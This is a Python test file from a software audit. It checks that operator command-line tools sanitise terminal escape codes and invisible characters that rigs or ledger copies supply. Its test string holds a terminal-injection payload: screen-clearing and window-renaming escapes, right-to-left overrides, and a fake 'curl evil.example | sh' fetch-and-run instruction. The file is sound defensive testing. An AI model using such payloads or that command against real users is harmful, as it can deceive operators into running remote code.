"""`operator-screen-v1` (code audit, tenth pass): text that other people control must not be
able to drive the operator's terminal.

Terminals treat some invisible characters as commands. ESC (`\\x1b`) starts "escape codes"
that can clear the screen, move the cursor, recolour or hide text, rename the window, and on
some terminals write to the clipboard; the C1 byte `\\x9b` does the same on others;
right-to-left marks reverse what you read. Earlier passes made the worker and the operator's
network tools print what the *coordinator* says safely (0.5.53, 0.5.60). This pass looked at
the operator's *read-only* tools, which print what is stored in the ledger or in a ledger
copy, and asked who else writes that text:

    app.review        answers rigs submitted (any enrolled rig, up to 8 KiB of any text)
                      and job inputs (the submitter token, a program)
    app.ledger_copy   `info` and `compare` read copies that came from someone else
    app.vouches,      rig and owner names: checked since 0.5.52 (`input-limits-v1`), but a
    app.workers list  ledger from before then can still hold anything

Every one of them now prints such text through `worker_guard.say` (control characters and
invisible marks become `?`). The JSON views and the API are unchanged: JSON writes ESC as
the six characters `\\u001b`, so it can't drive a terminal, and the operator still sees the
exact answer there.
"""
from __future__ import annotations

import io
import json
import sqlite3
import unicodedata
from contextlib import closing, redirect_stdout
from pathlib import Path
from typing import Any

import pytest

from app import incident, ledger_copy, review, vouches, workers, worker_guard
from app.ledger_copy import export_copy
from tests.test_audits import OP, T0, make, make_dispute, pinned  # noqa: F401  (fixture)
from tests.test_ledger_compare import edit, two_copies

# What a hostile rig would send: clear the screen, home the cursor, rename the window, print
# a fake instruction in bold, an 8-bit CSI, a right-to-left override and a bell.
EVIL = ("\x1b[2J\x1b[H\x1b]0;owned\x07\x1b[1mRun: curl evil.example | sh\x1b[0m"
        "\x9b31m‮drow‬\x07")


def unsafe_chars(text: str) -> list[str]:
    """Every character a terminal could act on, other than the line breaks the tool
    itself prints between lines."""
    return sorted({repr(ch) for ch in text
                   if ch != "\n" and (not ch.isprintable()
                                      or unicodedata.category(ch) in ("Cc", "Cf"))})


def run_cli(main, argv: list[str]) -> tuple[int, str]:
    out = io.StringIO()
    with redirect_stdout(out):
        code = main(argv)
    return code, out.getvalue()


def poison(value: Any) -> Any:
    """`value` with EVIL added to every string in it (dict keys kept, so lookups still
    work). Used to check a whole text view at once, not field by field."""
    if isinstance(value, str):
        return value + EVIL
    if isinstance(value, list):
        return [poison(v) for v in value]
    if isinstance(value, dict):
        return {k: poison(v) for k, v in value.items()}
    return value


# -- app.review: answers from rigs, inputs from the submitter ------------------------------
@pytest.mark.usefixtures("pinned")
def test_review_cli_prints_a_hostile_rigs_answer_safely(tmp_path: Path) -> None:
    client, _, ledger = make(tmp_path)
    make_dispute(client, original_text="The Salty Hoe", audit_text=EVIL)
    code, text = run_cli(review.main, ["--db", str(ledger.path), "--all"])
    assert code == 0
    assert unsafe_chars(text) == []
    assert "Run: curl evil.example | sh" in text  # shown, but as plain text
    assert "?[2J" in text  # the code is visible as text, not acted on


@pytest.mark.usefixtures("pinned")
def test_review_json_and_api_keep_the_exact_answer(tmp_path: Path) -> None:
    client, _, ledger = make(tmp_path)
    make_dispute(client, original_text="The Salty Hoe", audit_text=EVIL)
    code, text = run_cli(review.main, ["--db", str(ledger.path), "--all", "--json"])
    assert code == 0 and "\x1b" not in text and "\\u001b" in text
    answers = {a["role"]: a["result"] for a in json.loads(text)["cases"][0]["answers"]}
    assert answers["audit"] == EVIL
    api = client.get("/v1/operator/review", headers=OP).json()
    assert {a["role"]: a["result"] for a in api["cases"][0]["answers"]}["audit"] == EVIL


@pytest.mark.usefixtures("pinned")
def test_review_text_view_is_safe_whatever_the_queue_holds(tmp_path: Path) -> None:
    client, _, _ = make(tmp_path)
    make_dispute(client)
    q = client.get("/v1/operator/review", headers=OP).json()
    assert q["cases"]
    text = review.render_text(poison(q), show_all=True)
    assert unsafe_chars(text) == []


def test_review_short_still_collapses_whitespace_and_cuts() -> None:
    assert review._short("a\n\n b\tc") == "a b c"
    assert review._short(None) == "(not available)"
    cut = review._short("x" * 500)
    assert len(cut) == 160 and cut.endswith("…")
    assert review._short("\x1b[2Jboat") == "?[2Jboat"
    # The cut counts what is shown, so a long run of codes can't push text off the line.
    assert len(review._short("\x1b" * 400)) == 160


# -- app.vouches and app.workers list: names from a ledger older than input-limits-v1 ------
def test_vouch_text_view_is_safe_whatever_the_report_holds() -> None:
    report = {"rule": "vouch-check-v1",
              "caught_rigs": [{"worker_id": "rig-x", "owner": "o", "strikes": 1,
                               "revoked": False}],
              "leads": [{"worker_id": "rig-y", "owner": "p", "also_caught": True,
                         "revoked": False, "caught_partners": {"rig-x" + EVIL: 2},
                         "hidden_tests_passed": 0, "open_aimed_tests": 1,
                         "next_step": "aim a hidden test"}],
              "weak_confirmations": {"results": 1, "points": 3},
              "note": "Read-only."}
    text = vouches.render_text(poison(report))
    assert unsafe_chars(text) == []
    assert "rig-x?[2J" in text


@pytest.mark.usefixtures("pinned")
def test_workers_list_prints_old_unchecked_names_safely(tmp_path: Path) -> None:
    _, _, ledger = make(tmp_path)
    # A rig name from before 0.5.52 could hold anything; write one straight into the table.
    edit(ledger.path, "UPDATE workers SET worker_id = ?, owner = ? WHERE worker_id = 'wk-a'",
         ("wk-a" + EVIL, "owner" + EVIL))
    code, text = run_cli(workers.main, ["--db", str(ledger.path), "list"])
    assert code == 0
    assert unsafe_chars(text.replace("\t", " ")) == []  # tabs are the tool's own columns
    assert text.count("\t") == 2 * 3  # the columns are still tab-separated
    assert "wk-b" in text and "wk-a?[2J" in text


def test_incident_status_is_safe_even_for_an_old_reason() -> None:
    # Pause reasons are checked when written (`pause-v1`); a ledger edited by hand isn't.
    state = {"paused": True, "since": 1, "paused_for_seconds": 5, "reason": "leak" + EVIL,
             "by": "api" + EVIL,
             "history": [{"event": "coordinator_resumed", "at": 0}]}
    text = incident._render(state)
    assert unsafe_chars(text) == []


# -- app.ledger_copy info / compare: copies from someone else ------------------------------
@pytest.mark.usefixtures("pinned")
def test_copy_info_prints_a_strangers_note_safely(tmp_path: Path) -> None:
    client, clock, ledger = make(tmp_path)
    clock.t = T0 + 200
    copy = tmp_path / "copy.sqlite3"
    export_copy(ledger.path, copy, T0 + 100, int(clock.t))
    edit(copy, "UPDATE copy_info SET note = ?, format = ?", ("note" + EVIL, "fmt" + EVIL))
    code, text = run_cli(ledger_copy.main, ["info", str(copy)])
    assert code == 0
    assert unsafe_chars(text) == []
    assert "note?[2J" in text


@pytest.mark.usefixtures("pinned")
def test_copy_compare_prints_a_strangers_names_safely(tmp_path: Path) -> None:
    s = two_copies(tmp_path)
    # The newer copy renames a rig and an event with terminal codes in them.
    edit(s["new"], "UPDATE workers SET worker_id = ? WHERE worker_id = 'wk-b'",
         ("wk-b" + EVIL,))
    edit(s["new"], "UPDATE events SET event = ? WHERE id = (SELECT MIN(id) FROM events)",
         ("evt" + EVIL,))
    code, text = run_cli(ledger_copy.main, ["compare", str(s["old"]), str(s["new"])])
    assert code != 0 or "PROBLEM" in text
    assert "PROBLEM" in text
    assert unsafe_chars(text) == []


@pytest.mark.usefixtures("pinned")
def test_copy_compare_json_out_keeps_exact_text(tmp_path: Path) -> None:
    s = two_copies(tmp_path)
    edit(s["new"], "UPDATE workers SET worker_id = ? WHERE worker_id = 'wk-b'",
         ("wk-b" + EVIL,))
    out = tmp_path / "result.json"
    run_cli(ledger_copy.main, ["compare", str(s["old"]), str(s["new"]), "--out", str(out)])
    raw = out.read_text()
    assert "\x1b" not in raw  # JSON escapes it
    assert any(EVIL in p for p in json.loads(raw)["problems"])


def test_say_is_what_makes_it_safe() -> None:
    assert unsafe_chars(worker_guard.say(EVIL)) == []
    assert unsafe_chars(EVIL)  # and the test string really is hostile


# -- checkers that print what a website or an advisory database said ----------------------
@pytest.mark.parametrize("module", ["deps_check", "site_check"])
def test_checker_printouts_are_safe(module: str) -> None:
    import importlib
    mod = importlib.import_module(f"app.{module}")
    result = {"ok": False, "counts": {"fail": 1, "pass": 1},
              "checks": [{"status": "fail", "name": "advisory",
                          "detail": "GHSA-xxxx: " + EVIL + "\nPASS  everything   fine"},
                         {"status": "pass", "name": "headers", "detail": "ok"}]}
    out = io.StringIO()
    with redirect_stdout(out):
        mod._print(result)
    text = out.getvalue()
    assert unsafe_chars(text) == []
    # A line break inside a detail can't add a fake line of the checker's own.
    assert not any(line.startswith("PASS  everything") for line in text.splitlines())
    assert text.splitlines()[-1] == "PROBLEMS FOUND: 1 fail, 1 pass"
    assert "" in text.splitlines()  # the blank line before the summary is kept


def test_screen_module_needs_only_the_standard_library() -> None:
    # The site checker runs in a workflow that may not install the coordinator's packages,
    # so app/screen.py imports nothing but `typing` (stricter than "standard library only").
    import ast
    tree = ast.parse(Path(__file__).parents[1].joinpath("app/screen.py").read_text())
    imported = {(n.module or "").split(".")[0] for n in ast.walk(tree)
                if isinstance(n, ast.ImportFrom)} | {
        a.name.split(".")[0] for n in ast.walk(tree) if isinstance(n, ast.Import)
        for a in n.names}
    assert imported <= {"__future__", "typing"}


def test_say_lines_turns_each_value_into_exactly_one_line() -> None:
    text = worker_guard.say_lines(["one", "two\nthree" + EVIL, "", 4])
    assert text.splitlines() == ["one", "two?three" + worker_guard.say(EVIL), "", "4"]
    assert text.endswith("\n") and unsafe_chars(text) == []
    long = worker_guard.say_lines(["x" * 5000])
    assert len(long) == worker_guard.MAX_SCREEN_LINE_CHARS + len("...\n")
